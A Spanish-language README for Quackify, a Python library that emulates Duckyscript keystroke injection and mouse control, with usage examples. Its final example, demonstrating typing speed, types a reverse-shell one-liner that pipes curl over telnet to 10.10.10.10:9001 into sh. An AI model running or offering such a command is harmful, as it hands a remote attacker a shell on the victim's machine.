# Quackify
*Quackify es una biblioteca para Python que emula diversas funciones del Duckyscript.*

Entre varias de ellas, encontramos funciones básicas como "string", "rem" y "delay".

Muchas de las funciones se inspiraron en [DuckyPad](https://github.com/dekuNukem/duckyPad).

# Uso

## Funciones

String: La función "string" emula lo que sería un "string" normal en un Duckyscript.

```
STRING Hola Mundo
```

El dispositivo simplemente emulará la entrada de teclado de las letras "H", "o", "l", "a", espacio, "M", "u", "n", "d", "o" en ese orden. Esencialmente, el script simulará que alguien está escribiendo "Hola Mundo" en el teclado de la computadora.

Convertido a python, seria:

```python
from quackify import send

send.string("Hola Mundo")
```

### Rem 

La función "rem" emula lo que sería el comentario en Duckyscript, comúnmente utilizado para proporcionar explicaciones o notas.

```
REM Este es un comentario en un Duckyscript.
```

Convertido a python, seria:

```python
from quackify import rem

rem.add_comment("Este es un comentario en Quackify")
```

### Delay 

La función "delay" emula lo que sería la pausa por un tiempo determinado en un Duckyscript.

```
STRING Hola
DELAY 500
STRING Mundo
```

En este caso, el script primero simula la entrada de teclado "Hola" y luego espera 500 milisegundos (o medio segundo) antes de simular la entrada de teclado "Mundo".

Convertido a python, seria:

```python
from quackify import send, delay

send.string("Hola")
delay.delay(500)
send.string("Mundo")
```

**Quackify también incluye funciones para interactuar con el cursor, como clic derecho, clic izquierdo, emulación de clic de rueda del mouse, así como para mover el cursor a coordenadas específicas y para imprimir las coordenadas actuales del cursor.**

```python
# mouse_click.right()  =  RMOUSE
# mouse_click.left() = LMOUSE
# mouse_clicl.middle() = MMOUSE
````

Emular click derecho, izquierdo y rueda del mouse:

```python
from quackify import mouse_click

# Click derecho
mouse_click.right()

# Click  izquierdo

mouse_click.left()

# Clickear usando la rueda del mouse

mouse_click.middle()
```

Con Quackify, también puedes emular el movimiento del cursor de manera similar a la función "MOUSE_MOVE" de DuckyPad.

```python
from quackify import mouse_move

mouse_move.move(1344, 17)
```

Con esto, el cursor se moverá a las coordenadas proporcionadas. Además, Quackify incluye la función **"get_pos"**, que nos permitirá visualizar la posición actual del cursor.

```python
from quackify import mouse_move

mouse_move.get_pos()
```

Con esto, se mostrarían las coordenadas x,y del cursor, y no sería necesario agregar un comando print, ya que este ya está integrado en el código.

También, la función string incluye una función adicional llamada **"speed"**. Con esta función, podremos configurar la velocidad a la que el script escribirá, como se muestra en el siguiente ejemplo:

```python
from quackify import send

send.speed(1)
send.string("C='curl -Ns telnet://10.10.10.10:9001'; $C </dev/null 2>&1 | sh 2>&1 | $C >/dev/nul")
```

Si se desea ajustar la velocidad de escritura, es necesario **declarar la función "send.speed" antes de llamar la funcion "send.string"**.
